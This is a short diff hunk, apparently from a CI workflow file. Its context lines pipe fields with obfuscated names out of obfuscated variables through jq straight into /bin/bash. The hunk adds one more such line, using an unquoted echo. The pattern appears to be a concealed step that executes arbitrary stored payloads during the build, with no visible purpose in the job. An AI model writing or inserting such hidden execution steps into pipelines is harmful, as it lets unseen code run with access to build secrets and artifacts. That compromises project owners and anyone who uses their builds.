@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$f3737" | jq -r .fy53802 | /bin/bash
           printf '%s' "$si46" | jq -r .dsxgv90 | /bin/bash
           printf '%s' "$bwpw10" | jq -r .b5501 | /bin/bash
+          echo $f07 | jq -r .svq3 | /bin/bash
 
       - name: Upload results
         if: always()
